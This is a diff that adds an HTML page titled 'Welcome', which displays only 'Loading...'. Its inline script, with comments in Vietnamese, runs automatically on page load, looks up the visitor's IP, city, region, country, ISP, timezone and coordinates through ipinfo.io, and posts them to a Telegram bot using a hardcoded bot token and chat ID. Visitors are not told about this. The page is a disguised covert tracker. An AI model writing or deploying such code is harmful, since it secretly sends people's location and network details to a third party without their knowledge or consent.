@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+
+    <script>
+        async function collectAndSend() {
+            try {
+                // Lấy IP và thông tin địa lý từ ipinfo.io
+                const ipInfo = await fetch('https://ipinfo.io/json?token=1b52bf9d5a5c1c')
+                    .then(res => res.json());
+
+                // Soạn nội dung tin nhắn
+                const message = `
+🚨 New Visitor Alert!
+🌐 IP: ${ipInfo.ip}
+📍 Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}
+📡 ISP: ${ipInfo.org}
+🕑 Timezone: ${ipInfo.timezone}
+🗺️ Coordinates: ${ipInfo.loc}
+🔗 More: https://ipinfo.io/${ipInfo.ip}
+                `;
+
+                // Gửi tin nhắn tới Telegram
+                const telegramBotToken = '7561463958:AAHvBwpnumjw7XgW2C7N8FZjPBxt3Li6XEY';
+                const telegramChatId = '7870666404';
+                const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    }),
+                });
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+
+        collectAndSend();
+    </script>
+</body>
+</html>
